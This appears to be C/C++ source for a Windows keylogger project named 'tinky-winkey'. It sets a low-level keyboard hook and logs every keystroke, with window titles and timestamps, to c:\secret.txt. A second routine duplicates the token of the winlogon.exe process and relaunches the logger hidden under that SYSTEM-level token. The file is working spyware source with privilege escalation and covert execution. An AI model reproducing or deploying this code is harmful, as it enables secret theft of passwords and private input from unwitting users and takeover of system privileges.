#include "winkey.h"

HHOOK hHock = NULL;
HWND currWindow;
HWND lastWindow = NULL;
bool shift = false;
char title[256];
char* timebuf = (char*)malloc(sizeof(char) * 80);
FILE *file;
HANDLE                  newExecToken;
PROCESS_INFORMATION     winkeyPI;

DWORD GetPidByName(char* filename)
{
	HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
	PROCESSENTRY32 pEntry;
	PROCESSENTRY32 ptemp[5];
	pEntry.dwSize = sizeof(PROCESSENTRY32);
	BOOL hRes = Process32First(hSnapShot, &pEntry);
	int i = 0;
	while (hRes)
	{
		if (strcmp(pEntry.szExeFile, filename) == 0)
		{
			ptemp[i] = pEntry;
			i++;
			//CloseHandle(hSnapShot);
		}
		hRes = Process32Next(hSnapShot, &pEntry);
	}
	CloseHandle(hSnapShot);
	printf("%ld", ptemp[0].th32ProcessID);
	return(ptemp[i-1].th32ProcessID);
	//return(0);
}

void    Tinky_Winky() {
	DWORD winlogonPID;
	HANDLE wlPH;
	HANDLE wlTH;
	LPWSTR PP = L"C:\\Users\\User\\source\\repos\\tinky-winkey\\winkey.exe";
	STARTUPINFO Si;

	//ZeroMemory(&Si, sizeof(Si));
	//Si.cb = sizeof(Si);
	winlogonPID = GetPidByName("winlogon.exe");
	wlPH = OpenProcess(PROCESS_QUERY_INFORMATION, 0, winlogonPID);
	if (!OpenProcessToken(wlPH, TOKEN_DUPLICATE, &wlTH)) {
		printf("opt\n");
	}
	CloseHandle(wlPH);
	/*if (!DuplicateTokenEx(wlTH, TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID, NULL, SecurityImpersonation, TokenPrimary, &newExecToken)) {
		printf("dtEx\n");
	}*/
	if (!DuplicateTokenEx(wlTH, TOKEN_ALL_ACCESS, NULL, SecurityDelegation, TokenPrimary, &newExecToken)) {
		printf("dtEx\n");
	}
	CloseHandle(wlTH);

	/*if (!CreateProcessWithTokenW(newExecToken, LOGON_WITH_PROFILE, PP, NULL, CREATE_NO_WINDOW, NULL, NULL, NULL, &winkeyPI)) {
		printf("cpwt (%ld)\n", GetLastError());
	}*/
	if (!CreateProcessAsUserW(newExecToken, PP, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, (LPSTARTUPINFOW)&Si, &winkeyPI)) {
		printf("cpwt (%ld)\n", GetLastError());
	}
}

void getTime(char **timebuf) {
    time_t ltime;
    struct tm  tstruct;
    char buff[80];
    ltime = time(0);
    tstruct = *localtime(&ltime);
    strftime(buff, sizeof(buff), "%d-%m-%Y %X", &tstruct);
    strcpy(*timebuf, buff);
}

//void    KeyLogger() {
//    HWND currWindow;
//    char title[256];
//    char* timebuf;
//    timebuf = (char*)malloc(sizeof(char) * 80);
//    while (1) {
//        currWindow = GetForegroundWindow();
//        GetWindowText(currWindow, title, sizeof(title));
//        getTime(&timebuf);
//        printf("[ %s ] - ", timebuf);
//        printf(" '%s'\n", title);
//        ch = getch();
//        printf("%c", ch);
//        while (currWindow == GetForegroundWindow()) {
//            ch = getch();
//            printf("%c", ch);
//            ///key hooks
//
//        }
//        getTime(&timebuf);
//        printf("[ %s ] - ", timebuf);
//        printf(" 'window changed'\n");
//        Sleep(200);
//    }
//}

LRESULT CALLBACK KeyLogger(int nCode, WPARAM wParam, LPARAM lParam) {
	bool caps = false;
	int capsShort = GetKeyState(VK_CAPITAL);
	file = fopen("c:\\secret.txt", "a");
	if(capsShort)
	{
		caps = TRUE;
	}
	std::string buffer;
	//file.open("c:\\secret.txt", std::ios_base::app);
	KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
	if (p->vkCode == VK_LSHIFT || p->vkCode == VK_RSHIFT) {
		if (wParam == WM_KEYDOWN)
		{
			shift = TRUE;
		}
		if (wParam == WM_KEYUP)
		{
			shift = FALSE;
		}
		else
		{
			shift = FALSE;
		}
	}
	if (wParam == WM_SYSKEYDOWN || wParam == WM_KEYDOWN)
	{
		currWindow = GetForegroundWindow();
		if (currWindow != lastWindow) {
			GetWindowText(currWindow, title, sizeof(title));
			getTime(&timebuf);
			buffer.clear();
			buffer.append("\n[ ");
			buffer.append(timebuf);
			buffer.append(" ] - ");
			buffer.append(" '");
			buffer.append(title);
			buffer.append("'\n");
			lastWindow = currWindow;
		}
		if (p->vkCode) {
			buffer.append(HookCode(p->vkCode, caps, shift));
		}
	}
	fprintf(file, "%s", buffer.data());
	fclose(file);
	buffer.clear();
    return CallNextHookEx(hHock, nCode, wParam, lParam);
}

int main(int ac, char **av) {
	char* pass = "1337";
    MSG msg;
    if (ac == 2) {
        Tinky_Winky();
        return 0;
    }
	file = fopen("c:\\secret.txt", "a");
	fprintf(file, "%s", "winkey init \n");
	fclose(file);
    hHock = SetWindowsHookEx(WH_KEYBOARD_LL, KeyLogger, NULL, NULL);
	while (GetMessage(&msg, NULL, 0, 0) > 0)
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
    return 0;
}

char* HookCode(DWORD code, BOOL caps, BOOL shift)
{
	/*
	Translate the return code from hook and
	return the std::string rep of the the code.
	ex. 0x88 -> "[SHIFT]"
	caps = Caps lock on
	shift = Shift key pressed
	WinUser.h = define statments
	LINK = https://msdn.microsoft.com/en-us/library/dd375731(v=VS.85).aspx
	*/
	char *key;
	switch (code) // SWITCH ON INT
	{
		// Char keys for ASCI
		// No VM Def in header 
	case 0x41: key = caps ? (shift ? "a" : "A") : (shift ? "A" : "a"); break;
	case 0x42: key = caps ? (shift ? "b" : "B") : (shift ? "B" : "b"); break;
	case 0x43: key = caps ? (shift ? "c" : "C") : (shift ? "C" : "c"); break;
	case 0x44: key = caps ? (shift ? "d" : "D") : (shift ? "D" : "d"); break;
	case 0x45: key = caps ? (shift ? "e" : "E") : (shift ? "E" : "e"); break;
	case 0x46: key = caps ? (shift ? "f" : "F") : (shift ? "F" : "f"); break;
	case 0x47: key = caps ? (shift ? "g" : "G") : (shift ? "G" : "g"); break;
	case 0x48: key = caps ? (shift ? "h" : "H") : (shift ? "H" : "h"); break;
	case 0x49: key = caps ? (shift ? "i" : "I") : (shift ? "I" : "i"); break;
	case 0x4A: key = caps ? (shift ? "j" : "J") : (shift ? "J" : "j"); break;
	case 0x4B: key = caps ? (shift ? "k" : "K") : (shift ? "K" : "k"); break;
	case 0x4C: key = caps ? (shift ? "l" : "L") : (shift ? "L" : "l"); break;
	case 0x4D: key = caps ? (shift ? "m" : "M") : (shift ? "M" : "m"); break;
	case 0x4E: key = caps ? (shift ? "n" : "N") : (shift ? "N" : "n"); break;
	case 0x4F: key = caps ? (shift ? "o" : "O") : (shift ? "O" : "o"); break;
	case 0x50: key = caps ? (shift ? "p" : "P") : (shift ? "P" : "p"); break;
	case 0x51: key = caps ? (shift ? "q" : "Q") : (shift ? "Q" : "q"); break;
	case 0x52: key = caps ? (shift ? "r" : "R") : (shift ? "R" : "r"); break;
	case 0x53: key = caps ? (shift ? "s" : "S") : (shift ? "S" : "s"); break;
	case 0x54: key = caps ? (shift ? "t" : "T") : (shift ? "T" : "t"); break;
	case 0x55: key = caps ? (shift ? "u" : "U") : (shift ? "U" : "u"); break;
	case 0x56: key = caps ? (shift ? "v" : "V") : (shift ? "V" : "v"); break;
	case 0x57: key = caps ? (shift ? "w" : "W") : (shift ? "W" : "w"); break;
	case 0x58: key = caps ? (shift ? "x" : "X") : (shift ? "X" : "x"); break;
	case 0x59: key = caps ? (shift ? "y" : "Y") : (shift ? "Y" : "y"); break;
	case 0x5A: key = caps ? (shift ? "z" : "Z") : (shift ? "Z" : "z"); break;
		// Sleep Key
	case VK_SLEEP: key = "[SLEEP]"; break;
		// Num Keyboard 
	case VK_NUMPAD0:  key = "0"; break;
	case VK_NUMPAD1:  key = "1"; break;
	case VK_NUMPAD2: key = "2"; break;
	case VK_NUMPAD3:  key = "3"; break;
	case VK_NUMPAD4:  key = "4"; break;
	case VK_NUMPAD5:  key = "5"; break;
	case VK_NUMPAD6:  key = "6"; break;
	case VK_NUMPAD7:  key = "7"; break;
	case VK_NUMPAD8:  key = "8"; break;
	case VK_NUMPAD9:  key = "9"; break;
	case VK_MULTIPLY: key = "*"; break;
	case VK_ADD:      key = "+"; break;
	case VK_SEPARATOR: key = "-"; break;
	case VK_SUBTRACT: key = "-"; break;
	case VK_DECIMAL:  key = "."; break;
	case VK_DIVIDE:   key = "/"; break;
		// Function Keys
	case VK_F1:  key = "[F1]"; break;
	case VK_F2:  key = "[F2]"; break;
	case VK_F3:  key = "[F3]"; break;
	case VK_F4:  key = "[F4]"; break;
	case VK_F5:  key = "[F5]"; break;
	case VK_F6:  key = "[F6]"; break;
	case VK_F7:  key = "[F7]"; break;
	case VK_F8:  key = "[F8]"; break;
	case VK_F9:  key = "[F9]"; break;
	case VK_F10:  key = "[F10]"; break;
	case VK_F11:  key = "[F11]"; break;
	case VK_F12:  key = "[F12]"; break;
	case VK_F13:  key = "[F13]"; break;
	case VK_F14:  key = "[F14]"; break;
	case VK_F15:  key = "[F15]"; break;
	case VK_F16:  key = "[F16]"; break;
	case VK_F17:  key = "[F17]"; break;
	case VK_F18:  key = "[F18]"; break;
	case VK_F19:  key = "[F19]"; break;
	case VK_F20:  key = "[F20]"; break;
	case VK_F21:  key = "[F22]"; break;
	case VK_F22:  key = "[F23]"; break;
	case VK_F23:  key = "[F24]"; break;
	case VK_F24:  key = "[F25]"; break;
		// Keys
	case VK_NUMLOCK: key = "[NUM-LOCK]"; break;
	case VK_SCROLL:  key = "[SCROLL-LOCK]"; break;
	case VK_BACK:    key = "[BACK]"; break;
	case VK_TAB:     key = "[TAB]"; break;
	case VK_CLEAR:   key = "[CLEAR]"; break;
	case VK_RETURN:  key = "[ENTER]"; break;
	case VK_SHIFT:   key = "[SHIFT]"; break;
	case VK_CONTROL: key = "[CTRL]"; break;
	case VK_MENU:    key = "[ALT]"; break;
	case VK_PAUSE:   key = "[PAUSE]"; break;
	case VK_CAPITAL: key = "[CAP-LOCK]"; break;
	case VK_ESCAPE:  key = "[ESC]"; break;
	case VK_SPACE:   key = "[SPACE]"; break;
	case VK_PRIOR:   key = "[PAGEUP]"; break;
	case VK_NEXT:    key = "[PAGEDOWN]"; break;
	case VK_END:     key = "[END]"; break;
	case VK_HOME:    key = "[HOME]"; break;
	case VK_LEFT:    key = "[LEFT]"; break;
	case VK_UP:      key = "[UP]"; break;
	case VK_RIGHT:   key = "[RIGHT]"; break;
	case VK_DOWN:    key = "[DOWN]"; break;
	case VK_SELECT:  key = "[SELECT]"; break;
	case VK_PRINT:   key = "[PRINT]"; break;
	case VK_SNAPSHOT: key = "[PRTSCRN]"; break;
	case VK_INSERT:  key = "[INS]"; break;
	case VK_DELETE:  key = "[DEL]"; break;
	case VK_HELP:    key = "[HELP]"; break;
		// Number Keys with shift
	case 0x30:  key = shift ? "!" : "1"; break;
	case 0x31:  key = shift ? "@" : "2"; break;
	case 0x32:  key = shift ? "#" : "3"; break;
	case 0x33:  key = shift ? "$" : "4"; break;
	case 0x34:  key = shift ? "%" : "5"; break;
	case 0x35:  key = shift ? "^" : "6"; break;
	case 0x36:  key = shift ? "&" : "7"; break;
	case 0x37:  key = shift ? "*" : "8"; break;
	case 0x38:  key = shift ? "(" : "9"; break;
	case 0x39:  key = shift ? ")" : "0"; break;
		// Windows Keys
	case VK_LWIN:     key = "[WIN]"; break;
	case VK_RWIN:     key = "[WIN]"; break;
	case VK_LSHIFT:   key = "[SHIFT]"; break;
	case VK_RSHIFT:   key = "[SHIFT]"; break;
	case VK_LCONTROL: key = "[CTRL]"; break;
	case VK_RCONTROL: key = "[CTRL]"; break;
		// OEM Keys with shift 
	case VK_OEM_1:      key = shift ? ":" : ";"; break;
	case VK_OEM_PLUS:   key = shift ? "+" : "="; break;
	case VK_OEM_COMMA:  key = shift ? "<" : ","; break;
	case VK_OEM_MINUS:  key = shift ? "_" : "-"; break;
	case VK_OEM_PERIOD: key = shift ? ">" : "."; break;
	case VK_OEM_2:      key = shift ? "?" : "/"; break;
	case VK_OEM_3:      key = shift ? "~" : "`"; break;
	case VK_OEM_4:      key = shift ? "{" : "["; break;
	case VK_OEM_5:      key = shift ? "\\" : "|"; break;
	case VK_OEM_6:      key = shift ? "}" : "]"; break;
	case VK_OEM_7:      key = shift ? "'" : "'"; break; //TODO: Escape this char: "
	// Action Keys
	case VK_PLAY:       key = "[PLAY]";
	case VK_ZOOM:       key = "[ZOOM]";
	case VK_OEM_CLEAR:  key = "[CLEAR]";
	case VK_CANCEL:     key = "[CTRL-C]";

	default: key = "[UNK-KEY]"; break;
	}
	return key;

}